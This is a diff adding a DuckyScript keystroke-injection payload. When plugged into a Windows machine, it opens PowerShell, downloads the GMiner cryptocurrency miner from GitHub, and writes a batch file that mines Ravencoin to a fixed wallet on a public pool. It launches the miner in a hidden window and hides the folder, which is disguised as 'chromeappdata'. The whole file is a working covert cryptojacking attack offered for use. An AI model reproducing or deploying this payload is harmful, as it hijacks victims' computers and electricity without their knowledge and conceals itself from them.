@@ -1,0 +1,53 @@
+GUI r
+DELAY 250
+STRING powershell
+ENTER
+DELAY 250
+
+REM Localize
+STRING cd Desktop
+TAB
+ENTER
+DELAY 250
+STRING mkdir chromeappdata
+
+ENTER
+DELAY 250
+STRING cd chromeappdata
+TAB
+ENTER
+DELAY 250
+
+STRING Start-Process curl -ArgumentList "-s -L -o cmdMD23111891.zip https://github.com/develsoftware/GMinerRelease/releases/download/3.41/gminer_3_41_windows64.zip" -NoNewWindow
+ENTER
+DELAY 3000
+STRING Expand-Archive -Path ".\cmdMD23111891.zip" -DestinationPath ".\" 
+ENTER
+DELAY 2000
+
+STRING $filesToKeep = @('mine_ravencoin.bat', 'miner.exe', 'miner.exe.sig', 'public.gpg')  # Add the filenames you want to keep to this array
+SHIFT ENTER
+DELAY 100
+STRING Get-ChildItem -File | Where-Object { $_.Name -notin $filesToKeep } | Remove-Item -Force
+ENTER
+DELAY 1200
+
+STRING Set-Content -Path .\mine_ravencoin.bat -Value "miner.exe --algo kawpow --server us-rvn.2miners.com:6060 --intensity 50 --user RY3GhiW9KVLYqhvqDGuXoi7EZ78oFMqRsU" -Force
+ENTER
+DELAY 250
+STRING echo Batch script completed.
+ENTER
+DELAY 250
+ENTER
+DELAY 250
+STRING Start-Process -FilePath ".\mine_ravencoin.bat" -WindowStyle Hidden
+DELAY 200
+ENTER
+STRING cd ..
+DELAY 200
+ENTER
+STRING Set-ItemProperty -Path ".\chromeappdata" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+ENTER
+DELAY 250
+STRING exit
+ENTER
